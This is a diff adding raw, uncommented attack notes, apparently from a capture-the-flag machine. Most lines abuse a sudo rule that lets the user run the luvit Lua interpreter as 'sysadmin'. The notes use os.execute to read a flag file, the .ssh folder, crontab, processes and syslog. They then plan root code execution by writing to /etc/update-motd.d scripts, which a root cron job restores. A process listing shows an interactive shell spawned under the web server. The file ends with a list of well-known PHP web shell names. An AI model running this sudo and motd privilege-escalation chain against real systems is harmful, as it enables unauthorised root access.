@@ -1,0 +1,98 @@
+sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+rm .k.lua; touch .k.lua; echo "os.execute('ls -al /home/sysadmin/.ssh/')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+rm .k.lua; touch .k.lua; echo "os.execute('cat /home/sysadmin/user.txt')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+rm .k.lua; touch .k.lua; echo "os.execute('ls -al /home/sysadmin')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+drwxr-x--- 5 sysadmin sysadmin    4096 Mar 16 03:53 .
+drwxr-xr-x 4 root     root        4096 Aug 25  2019 ..
+-rw------- 1 sysadmin sysadmin       1 Aug 25  2019 .bash_history
+-rw-r--r-- 1 sysadmin sysadmin     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 sysadmin sysadmin    3771 Apr  4  2018 .bashrc
+drwx------ 2 sysadmin sysadmin    4096 Aug 25  2019 .cache
+drwxrwxr-x 3 sysadmin sysadmin    4096 Aug 24  2019 .local
+-rw-r--r-- 1 sysadmin sysadmin     807 Apr  4  2018 .profile
+drwxr-xr-x 2 root     root        4096 Aug 25  2019 .ssh
+-rwxrwxr-x 1 sysadmin sysadmin 4397566 Aug 24  2019 luvit
+-rw------- 1 sysadmin sysadmin      33 May 30 12:28 user.txt
+
+rm .k.lua; touch .k.lua; echo "os.execute('crontab -l')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+rm .k.lua; touch .k.lua; echo "os.execute('touch /etc/update-motd.d/pot')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+rm .k.lua; touch .k.lua; echo "os.execute('cat /home/sysadmin/.profile')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+rm .k.lua; touch .k.lua; echo "os.execute('ls -al /home/sysadmin/')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+rm .k.lua; touch .k.lua; echo "os.execute('ps -aux')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+rm .k.lua; touch .k.lua; echo "os.execute('cat /var/log/syslog')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+root        305  0.0  0.0 158788   308 ?        Ssl  15:47   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
+systemd+    308  0.0  0.1  71848  5372 ?        Ss   15:47   0:00 /lib/systemd/systemd-networkd
+root        410  0.0  0.2  88224  9468 ?        Ss   15:47   0:00 /usr/bin/VGAuthService
+systemd+    412  0.0  0.1  70892  6248 ?        Ss   15:47   0:00 /lib/systemd/systemd-resolved
+systemd+    414  0.0  0.0 141928  3296 ?        Ssl  15:47   0:00 /lib/systemd/systemd-timesyncd
+root        415  0.0  0.2 201880 11712 ?        Ssl  15:47   0:02 /usr/bin/vmtoolsd
+root        443  0.0  0.1  62020  5704 ?        Ss   15:47   0:00 /lib/systemd/systemd-logind
+root        446  0.0  0.0 110512  3584 ?        Ssl  15:47   0:00 /usr/sbin/irqbalance --foreground
+root        457  0.0  0.1 287544  6912 ?        Ssl  15:47   0:00 /usr/lib/accountsservice/accounts-daemon
+message+    458  0.0  0.1  49928  4416 ?        Ss   15:47   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root        469  0.0  0.0  31320  3264 ?        Ss   15:48   0:00 /usr/sbin/cron -f
+root        470  0.0  0.4 170524 17184 ?        Ssl  15:48   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+syslog      471  0.0  0.1 263036  4376 ?        Ssl  15:48   0:00 /usr/sbin/rsyslogd -n
+root        473  0.0  0.1  72296  6368 ?        Ss   15:48   0:00 /usr/sbin/sshd -D
+root        515  0.0  0.0  16180  1912 tty1     Ss+  15:48   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root        546  0.0  0.4 327120 16832 ?        Ss   15:48   0:00 /usr/sbin/apache2 -k start
+webadmin    558  0.0  0.3 331968 15748 ?        S    15:48   0:00 /usr/sbin/apache2 -k start
+webadmin    559  0.0  0.3 332088 14816 ?        S    15:48   0:00 /usr/sbin/apache2 -k start
+webadmin    560  0.0  0.3 332152 14840 ?        S    15:48   0:00 /usr/sbin/apache2 -k start
+webadmin    561  0.0  0.3 331968 13284 ?        S    15:48   0:00 /usr/sbin/apache2 -k start
+webadmin    562  0.0  0.3 331744 12920 ?        S    15:48   0:00 /usr/sbin/apache2 -k start
+webadmin    735  0.0  0.3 331968 14448 ?        S    15:48   0:00 /usr/sbin/apache2 -k start
+root       1141  0.0  0.0      0     0 ?        I    15:55   0:00 [kworker/u256:1]
+webadmin   1396  0.0  0.0   4628   808 ?        S    16:06   0:00 sh -c uname -a; w; id; /bin/sh -i
+webadmin   1400  0.0  0.0   4628  1804 ?        S    16:06   0:00 /bin/sh -i
+webadmin   1729  0.0  0.0   4628  1764 ?        S    16:22   0:00 /bin/sh -i
+webadmin   1746  0.0  0.2 331524  8944 ?        S    16:24   0:00 /usr/sbin/apache2 -k start
+root       1818  0.0  0.0      0     0 ?        I    16:32   0:00 [kworker/u256:2]
+root       1966  0.0  0.0      0     0 ?        I    16:39   0:00 [kworker/1:0]
+root       2106  0.0  0.0      0     0 ?        I    16:46   0:00 [kworker/u256:0]
+
+2020/05/30 17:49:39 CMD: UID=1000 PID=4083   | /usr/sbin/apache2 -k start 
+2020/05/30 17:49:41 CMD: UID=1000 PID=4084   | ssh-keygen 
+2020/05/30 17:50:01 CMD: UID=0    PID=4090   | sleep 30 
+2020/05/30 17:50:01 CMD: UID=0    PID=4088   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
+2020/05/30 17:50:01 CMD: UID=0    PID=4085   | /usr/sbin/CRON -f 
+2020/05/30 17:50:31 CMD: UID=0    PID=4091   | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ 
+2020/05/30 17:51:01 CMD: UID=0    PID=4097   | sleep 30 
+2020/05/30 17:51:01 CMD: UID=0    PID=4095   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
+2020/05/30 17:51:01 CMD: UID=0    PID=4092   | /usr/sbin/CRON -f 
+
+rm .k.lua; touch .k.lua; echo "os.execute('/usr/sbin/cron -f')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+rm .k.lua; touch .k.lua; echo "os.execute('echo "potato" >> /etc/update-motd.d/00-header; cat /etc/update-motd.d/00-header')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+rm .k.lua; touch .k.lua; echo "os.execute('cat /etc/update-motd.d/00-header')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+rm .k.lua; touch .k.lua; echo "os.execute('cat /etc/update-motd.d/10-help-text')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+rm .k.lua; touch .k.lua; echo "os.execute('cat /etc/update-motd.d/50-motd-news')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+rm .k.lua; touch .k.lua; echo "os.execute('cat /etc/update-motd.d/80-esm')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+rm .k.lua; touch .k.lua; echo "os.execute('cat /etc/update-motd.d/91-release-upgrade')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+
+
+rm .k.lua; touch .k.lua; echo "os.execute('echo "potato" > /etc/update-motd.d/91-release-upgrade; cat /etc/update-motd.d/00-header')" >> .k.lua;sudo -u sysadmin /home/sysadmin/luvit .k.lua
+alfa3.php
+alfav3.0.1.php
+andela.php
+bloodsecv4.php
+by.php
+c99ud.php
+cmd.php
+configkillerionkros.php
+jspshell.jsp
+mini.php
+obfuscated-punknopass.php
+punk-nopass.php
+punkholic.php
+r57.php
+smevk.php
+wso2.8.5.php
